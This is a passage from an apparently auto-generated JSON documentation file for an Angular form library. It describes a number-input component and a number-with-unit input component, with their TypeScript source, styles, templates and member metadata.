  }\n  }\n\n  ngOnDestroy(): void {\n    this.stateChanges.complete();\n    this.fm.stopMonitoring(this.elRef.nativeElement);\n    this.sub.unsubscribe();\n  }\n\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  onContainerClick(event: MouseEvent): void {\n    this.elRef.nativeElement.querySelector('input')?.focus();\n  }\n\n  setDescribedByIds(ids: string[]): void {\n    this.describedBy = ids.join(' ');\n  }\n\n  // eslint-disable-next-line\n  onChange = (_: any) => {\n  };\n  // eslint-disable-next-line\n  onTouched = () => {\n  };\n\n  matOnTouched() {\n    this.stateChanges.next();\n  }\n\n  writeValue(value: number): void {\n    this.value = value;\n  }\n\n  registerOnChange(fn: never): void {\n    this.onChange = fn;\n  }\n\n  registerOnTouched(fn: never): void {\n    this.onTouched = fn;\n  }\n\n  setDisabledState(isDisabled: boolean): void {\n    this.disabled = isDisabled;\n  }\n\n\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ".mat-form-field.sto-form__field {\n  .sto-number-input {\n    border: none;\n    width: 100%;\n    background: none;\n    padding: 0;\n    outline: none;\n    font: inherit;\n  }\n}\n\n",
          "styleUrl": "./number-input.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "ngControl",
            "type": "NgControl",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "fm",
            "type": "FocusMonitor",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "_parentForm",
            "type": "NgForm",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "_parentFormGroup",
            "type": "FormGroupDirective",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "_defaultErrorStateMatcher",
            "type": "ErrorStateMatcher",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "elRef",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 54,
        "jsdoctags": [
          {
            "name": "ngControl",
            "type": "NgControl",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "fm",
            "type": "FocusMonitor",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "_parentForm",
            "type": "NgForm",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "_parentFormGroup",
            "type": "FormGroupDirective",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "_defaultErrorStateMatcher",
            "type": "ErrorStateMatcher",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "elRef",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "extends": "FormFieldBase",
      "implements": [
        "DoCheck",
        "OnInit",
        "OnDestroy",
        "ControlValueAccessor",
        "MatFormFieldControl"
      ],
      "accessors": {
        "shouldLabelFloat": {
          "name": "shouldLabelFloat",
          "getSignature": {
            "name": "shouldLabelFloat",
            "type": "",
            "returnType": "",
            "line": 84
          }
        },
        "disabled": {
          "name": "disabled",
          "setSignature": {
            "name": "disabled",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 95,
            "jsdoctags": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "disabled",
            "type": "boolean",
            "returnType": "boolean",
            "line": 91
          }
        },
        "readonly": {
          "name": "readonly",
          "setSignature": {
            "name": "readonly",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 109,
            "jsdoctags": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "readonly",
            "type": "boolean",
            "returnType": "boolean",
            "line": 105
          }
        },
        "fractionSize": {
          "name": "fractionSize",
          "setSignature": {
            "name": "fractionSize",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "fractionSize",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 121,
            "jsdoctags": [
              {
                "name": "fractionSize",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "fractionSize",
            "type": "",
            "returnType": "",
            "line": 117
          }
        },
        "empty": {
          "name": "empty",
          "getSignature": {
            "name": "empty",
            "type": "",
            "returnType": "",
            "line": 130
          }
        },
        "placeholder": {
          "name": "placeholder",
          "setSignature": {
            "name": "placeholder",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "plh",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 142,
            "jsdoctags": [
              {
                "name": "plh",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "placeholder",
            "type": "",
            "returnType": "",
            "line": 138
          }
        },
        "tabIndex": {
          "name": "tabIndex",
          "setSignature": {
            "name": "tabIndex",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "tabIndex",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 154,
            "jsdoctags": [
              {
                "name": "tabIndex",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "tabIndex",
            "type": "",
            "returnType": "",
            "line": 150
          }
        },
        "required": {
          "name": "required",
          "setSignature": {
            "name": "required",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "req",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 166,
            "jsdoctags": [
              {
                "name": "req",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "required",
            "type": "",
            "returnType": "",
            "line": 162
          }
        },
        "value": {
          "name": "value",
          "setSignature": {
            "name": "value",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "value",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 178,
            "jsdoctags": [
              {
                "name": "value",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "value",
            "type": "",
            "returnType": "",
            "line": 174
          }
        }
      },
      "templateData": "<input numberInput\n       class=\"sto-number-input\"\n       (blur)=\"onTouched()\"\n       [fractionSize]=\"fractionSize\"\n       [dynamicFractionSize]=\"dynamicFractionSize\"\n       [placeholder]=\"placeholder\"\n       [readonly]=\"readonly\"\n       [tabindex]=\"readonly ? -1 : (tabIndex || 0)\"\n       type=\"text\"\n       [formControl]=\"ctrl\">\n<div>\n  <ng-content select=\"mat-option\"></ng-content>\n</div>\n"
    },
    {
      "name": "NumberUnitInputComponent",
      "id": "component-NumberUnitInputComponent-24723e662f0c61b12aaab4606b4af880eb146e92718e7564cd4d01fc891f64978684b03868b4df06d98084f07f89733da7ad048b1bbc4a073546ce131e8ec61e",
      "file": "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [
        {
          "name": "{ provide: MatFormFieldControl, useExisting: NumberUnitInputComponent }",
          "type": "component"
        }
      ],
      "selector": "sto-number-unit-input",
      "styleUrls": [
        "./number-unit-input.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./number-unit-input.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "disabled",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 96,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "fractionSize",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 138,
          "type": "number",
          "decorators": []
        },
        {
          "name": "list",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 126,
          "type": "{}",
          "decorators": []
        },
        {
          "name": "placeholder",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 155,
          "type": "string",
          "decorators": []
        },
        {
          "name": "readonly",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 112,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "required",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 179,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "unitClearText",
          "defaultValue": "'(none)'",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 64,
          "type": "string",
          "decorators": []
        },
        {
          "name": "unitOptional",
          "defaultValue": "true",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 62,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "unitPlaceholder",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 167,
          "type": "string",
          "decorators": []
        }
      ],
      "outputsClass": [],
      "propertiesClass": [
        {
          "name": "_disabled",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 93,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_fractionSize",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 135,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_list",
          "defaultValue": "[]",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "literal type[]",
          "optional": false,
          "description": "",
          "line": 123,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_placeholder",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 152,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_readonly",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 109,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_required",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 176,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_unitPlaceholder",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 164,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_value",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "NumberUnit | null",
          "optional": false,
          "description": "",
          "line": 193,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "autofilled",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 52,
          "modifierKind": [
            144
          ]
        },
        {
          "name": "controlType",
          "defaultValue": "'number-unit-input'",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 53
        },
        {
          "name": "describedBy",
          "defaultValue": "''",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 68,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": "'attr.aria-describedby'"
            }
          ]
        },
        {
          "name": "errorState",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 60,
          "inheritance": {
            "file": "FormFieldBase"
          }
        },
        {
          "name": "focused",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 65,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "form",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "FormGroup<NumberUnitForm>",
          "optional": false,
          "description": "",
          "line": 51,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "id",
          "defaultValue": "`value-unit-input-${NumberUnitInputComponent.nextId++}`",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 67,
          "decorators": [
            {
              "name": "HostBinding",
              "stringifiedArguments": ""
            }
          ]
        },
        {
          "name": "input",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef<HTMLInputElement>",
          "optional": false,
          "description": "",
          "line": 57,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "'input'"
            }
          ]
        },
        {
          "name": "nextId",
          "defaultValue": "0",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 49,
          "modifierKind": [
            124
          ]
        },
        {
          "name": "ngControl",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "NgControl",
          "optional": false,
          "description": "",
          "line": 72,
          "decorators": [
            {
              "name": "Optional",
              "stringifiedArguments": ""
            },
            {
              "name": "Self",
              "stringifiedArguments": ""
            }
          ],
          "modifierKind": [
            123
          ],
          "inheritance": {
            "file": "FormFieldBase"
          }
        },
        {
          "name": "numberFormatterPipe",
          "defaultValue": "new NumberInputPipe()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 70,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "numberInputDirective",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "NumberInputDirective",
          "optional": false,
          "description": "",
          "line": 59,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "NumberInputDirective"
            }
          ]
        },
        {
          "name": "onChange",
          "defaultValue": "() => {...}",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 261
        },
        {
          "name": "onTouched",
          "defaultValue": "() => {...}",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 264
        },
        {
          "name": "select",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MatSelect",
          "optional": false,
          "description": "",
          "line": 55,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "MatSelect"
            }
          ]
        },
        {
          "name": "stateChanges",
          "defaultValue": "new Subject<void>()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 50,
          "inheritance": {
            "file": "FormFieldBase"
          }
        },
        {
          "name": "sub",
          "defaultValue": "new Subscription()",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 69,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "_defaultErrorStateMatcher",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ErrorStateMatcher",
          "optional": false,
          "description": "",
          "line": 19,
          "modifierKind": [
            123
          ],
          "inheritance": {
            "file": "FormFieldBase"
          }
        },
        {
          "name": "_elementRef",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef",
          "optional": false,
          "description": "",
          "line": 18,
          "modifierKind": [
            123
          ],
          "inheritance": {
            "file": "FormFieldBase"
          }
        },
        {
          "name": "_parentForm",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "NgForm",
          "optional": false,
          "description": "",
          "line": 20,
          "modifierKind": [
            123
          ],
          "inheritance": {
            "file": "FormFieldBase"
          }
        },
        {
          "name": "_parentFormGroup",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "FormGroupDirective",
          "optional": false,
          "description": "",
          "line": 21,
          "modifierKind": [
            123
          ],
          "inheritance": {
            "file": "FormFieldBase"
          }
        },
        {
          "name": "errorStateMatcher",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ErrorStateMatcher",
          "optional": false,
          "description": "",
          "line": 16,
          "inheritance": {
            "file": "FormFieldBase"
          }
        }
      ],
      "methodsClass": [
        {
          "name": "ngDoCheck",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 210,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnDestroy",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 236,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "ngOnInit",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 216,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "onContainerClick",
          "args": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 243,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "MouseEvent",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "registerOnChange",
          "args": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 271,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "registerOnTouched",
          "args": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 275,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "fn",
              "type": "never",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "setDescribedByIds",
          "args": [
            {
              "name": "ids",
              "type": "string[]",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 255,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "ids",
              "type": "string[]",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "setDisabledState",
          "args": [
            {
              "name": "isDisabled",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 279,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "isDisabled",
              "type": "boolean",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "writeValue",
          "args": [
            {
              "name": "value",
              "type": "NumberUnit | null",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 267,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "value",
              "type": "NumberUnit | null",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "updateErrorState",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 25,
          "deprecated": false,
          "deprecationMessage": "",
          "inheritance": {
            "file": "FormFieldBase"
          }
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [
        {
          "name": "attr.aria-describedby",
          "defaultValue": "''",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 68,
          "type": "string",
          "decorators": []
        },
        {
          "name": "class.floating",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 189,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "id",
          "defaultValue": "`value-unit-input-${NumberUnitInputComponent.nextId++}`",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 67,
          "type": "string",
          "decorators": []
        }
      ],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import {\n  ChangeDetectionStrategy,\n  Component,\n  DoCheck,\n  ElementRef,\n  HostBinding,\n  Input,\n  OnDestroy,\n  OnInit,\n  Optional,\n  Self,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { ControlValueAccessor, FormBuilder, FormControl, FormGroup, FormGroupDirective, NgControl, NgForm } from '@angular/forms';\nimport { MatFormFieldControl } from '@angular/material/form-field';\nimport { Subject, Subscription } from 'rxjs';\nimport { FocusMonitor } from '@angular/cdk/a11y';\nimport { coerceBooleanProperty } from '@angular/cdk/coercion';\nimport { NumberInputPipe } from '../number-input.pipe';\nimport { MatSelect } from '@angular/material/select';\nimport { FormFieldBase } from '../../sto-form/form-field.base';\nimport { ErrorStateMatcher } from '@angular/material/core';\nimport { debounceTime } from 'rxjs/operators';\nimport { NumberInputDirective } from '../number-input.directive';\n\nclass NumberUnit {\n  value: number | string | null;\n  unit: string | null;\n}\n\ntype NumberUnitForm = {\n  value: FormControl<number | string | null>,\n  unit: FormControl<string | null>\n};\n\n@Component({\n  selector: 'sto-number-unit-input',\n  templateUrl: './number-unit-input.component.html',\n  styleUrls: [ './number-unit-input.component.scss' ],\n  providers: [\n    { provide: MatFormFieldControl, useExisting: NumberUnitInputComponent }\n  ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class NumberUnitInputComponent extends FormFieldBase\n  implements DoCheck, OnInit, OnDestroy, ControlValueAccessor, MatFormFieldControl<NumberUnit> {\n  static nextId = 0;\n  stateChanges = new Subject<void>();\n  public form: FormGroup<NumberUnitForm>;\n  readonly autofilled: boolean;\n  controlType = 'number-unit-input';\n  @ViewChild(MatSelect)\n  select: MatSelect;\n  @ViewChild('input')\n  input: ElementRef<HTMLInputElement>;\n  @ViewChild(NumberInputDirective)\n  numberInputDirective: NumberInputDirective;\n  errorState: boolean;\n  @Input()\n  unitOptional = true;\n  @Input()\n  unitClearText = '(none)';\n  public focused: boolean;\n  @HostBinding()\n  id = `value-unit-input-${NumberUnitInputComponent.nextId++}`;\n  @HostBinding('attr.aria-describedby') describedBy = '';\n  public sub = new Subscription();\n  private numberFormatterPipe = new NumberInputPipe();\n\n  constructor(@Optional() @Self() public ngControl: NgControl,\n              private fm: FocusMonitor,\n              private fb: FormBuilder,\n              @Optional() _parentForm: NgForm,\n              @Optional() _parentFormGroup: FormGroupDirective,\n              _defaultErrorStateMatcher: ErrorStateMatcher,\n              private elRef: ElementRef<HTMLElement>) {\n    super(elRef, _defaultErrorStateMatcher, _parentForm, _parentFormGroup, ngControl);\n    this.form = this.fb.group<NumberUnitForm>({\n      value: this.fb.control(null),\n      unit: this.fb.control(null)\n    });\n    if ( this.ngControl != null ) {\n      this.ngControl.valueAccessor = this;\n    }\n    fm.monitor(elRef.nativeElement, true).subscribe(origin => {\n      this.focused = !!origin;\n      this.stateChanges.next();\n    });\n  }\n\n  private _disabled = false;\n\n  @Input()\n  get disabled(): boolean {\n    return this._disabled;\n  }\n\n  set disabled(disable: boolean) {\n    this._disabled = coerceBooleanProperty(disable);\n    const opts = { onlySelf: true, emitEvent: false };\n    disable ? this.form.disable(opts) : this.form.enable(opts);\n    // disable ? this.form.get('unit').disable(opts) : this.form.get('unit').enable(opts);\n    // disable ? this.form.get('value').disable(opts) : this.form.get('value').enable(opts);\n    this.stateChanges.next();\n  }\n\n  private _readonly = false;\n\n  @Input()\n  get readonly(): boolean {\n    return this._readonly;\n  }\n\n  set readonly(value: boolean) {\n    this._readonly = coerceBooleanProperty(value);\n    const opts = { onlySelf: true, emitEvent: false };\n    value ? this.form.get('unit')?.disable(opts) : this.form.get('unit')?.enable(opts);\n    this.stateChanges.next();\n  }\n\n  private _list: { value: unknown; title?: string; }[] = [];\n\n  @Input()\n  get list() {\n    return this._list;\n  }\n\n  set list(value) {\n    this._list = value;\n    this.stateChanges.next();\n  }\n\n  private _fractionSize: number;\n\n  @Input()\n  get fractionSize() {\n    return this._fractionSize || 3;\n  }\n\n  set fractionSize(fractionSize) {\n    this._fractionSize = fractionSize;\n    this.stateChanges.next();\n  }\n\n  get empty() {\n    const n = this.form.value;\n    return !n.value && !n.unit;\n  }\n\n  private _placeholder: string;\n\n  @Input()\n  get placeholder() {\n    return this._placeholder || '';\n  }\n\n  set placeholder(plh) {\n    this._placeholder = plh;\n    this.stateChanges.next();\n  }\n\n  private _unitPlaceholder: string;\n\n  @Input()\n  get unitPlaceholder() {\n    return this._unitPlaceholder || '';\n  }\n\n  set unitPlaceholder(plh) {\n    this._unitPlaceholder = plh;\n    this.stateChanges.next();\n  }\n\n  private _required = false;\n\n  @Input()\n  get required() {\n    return this._required;\n  }\n\n  set required(req) {\n    this._required = coerceBooleanProperty(req);\n    this.stateChanges.next();\n  }\n\n  @HostBinding('class.floating')\n  get shouldLabelFloat() {\n    return this.focused || !this.empty;\n  }\n\n  private _value: NumberUnit | null;\n\n  get value(): NumberUnit | null {\n    return this._value;\n  }\n\n  set value(value: NumberUnit | null) {\n    if ( value ) {\n      const parsedValue = this.numberFormatterPipe.transform(value.value, this.fractionSize);\n      this._value = { ...value, value: parsedValue };\n    } else {\n      this._value = value;\n    }\n    this.form.patchValue(this._value || {}, { emitEvent: false });\n    this.stateChanges.next();\n  }\n\n  ngDoCheck(): void {\n    if ( this.ngControl ) {\n      this.updateErrorState();\n    }\n  }\n\n  ngOnInit(): void {\n    const sub = this.form.valueChanges\n      .subscribe((value) => {\n        const valueAsString = value.value as string;\n        let numberValue: number | null = parseFloat(this.numberFormatterPipe.parse(valueAsString, this.fractionSize));\n        numberValue = !isNaN(numberValue) ? numberValue : null;\n        this.onChange({ ...value, value: numberValue });\n      });\n\n    this.sub.add(this.stateChanges.pipe(debounceTime(50)).subscribe(() => {\n      this.numberInputDirective?.setDisplayValue(this.readonly);\n    }));\n    this.sub.add(sub);\n    if ( this.ngControl && this.ngControl.statusChanges ) {\n      this.sub.add(this.ngControl.statusChanges\n        .subscribe(() => this.updateErrorState())\n      );\n    }\n  }\n\n  ngOnDestroy(): void {\n    this.stateChanges.complete();\n    this.fm.stopMonitoring(this.elRef.nativeElement);\n    this.sub.unsubscribe();\n  }\n\n\n  onContainerClick(event: MouseEvent) {\n    const rect = this.input.nativeElement.getBoundingClientRect();\n    const isInputFocus = rect.right >= event.clientX;\n    if ( isInputFocus ) {\n      this.elRef.nativeElement.querySelector('input')?.focus();\n    } else {\n      this.select.focus();\n      this.select.open();\n    }\n  }\n\n\n  setDescribedByIds(ids: string[]) {\n    this.describedBy = ids.join(' ');\n  }\n\n\n  // eslint-disable-next-line @typescript-eslint/no-empty-function,@typescript-eslint/no-unused-vars\n  onChange = (_: unknown) => {\n  };\n  // eslint-disable-next-line @typescript-eslint/no-empty-function\n  onTouched = () => {\n  };\n\n  writeValue(value: NumberUnit | null): void {\n    this.value = value;\n  }\n\n  registerOnChange(fn: never): void {\n    this.onChange = fn;\n  }\n\n  registerOnTouched(fn: never): void {\n    this.onTouched = fn;\n  }\n\n  setDisabledState(isDisabled: boolean): void {\n    this.disabled = isDisabled;\n  }\n\n}\n\n// {eslint-plugin,eslint-plugin-template,template-parser}@^14.0.0\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ".mat-form-field.sto-form__field {\n  sto-number-unit-input {\n    .number-unit-input-container {\n      display: grid;\n      grid-template-columns: 20fr 45px;\n      grid-column-gap: 8px;\n    }\n\n    .number-unit-input-element {\n      border: none;\n      background: none;\n      padding: 0;\n      outline: none;\n      font: inherit;\n\n      .mat-select-placeholder {\n        transition: none;\n      }\n\n      .mat-select-value-text span {\n        pointer-events: none;\n      }\n\n\n    }\n\n\n    &.floating .number-unit-input-spacer {\n    }\n\n    .number-unit-input-spacer {\n      height: 44px;\n      width: 1px;\n      position: absolute;\n      right: 55px;\n      top: -19px;\n    }\n  }\n\n  &:not(.sto-form__field--readonly) {\n    .number-unit-input-element {\n      &:focus, &:focus .mat-select-placeholder {\n        font-weight: bold;\n      }\n    }\n  }\n\n  &.sto-form__field--readonly {\n    .number-unit-input-spacer {\n      opacity: 0;\n    }\n  }\n\n  &.sto-form__field--readonly {\n    .mat-select-arrow {\n      opacity: 0;\n    }\n  }\n}\n\n",
          "styleUrl": "./number-unit-input.component.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "ngControl",
            "type": "NgControl",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "fm",
            "type": "FocusMonitor",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "fb",
            "type": "FormBuilder",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "_parentForm",
            "type": "NgForm",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "_parentFormGroup",
            "type": "FormGroupDirective",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "_defaultErrorStateMatcher",
            "type": "ErrorStateMatcher",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "elRef",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 70,
        "jsdoctags": [
          {
            "name": "ngControl",
            "type": "NgControl",
            "deprecated": false,
            "deprecationMessage": "",
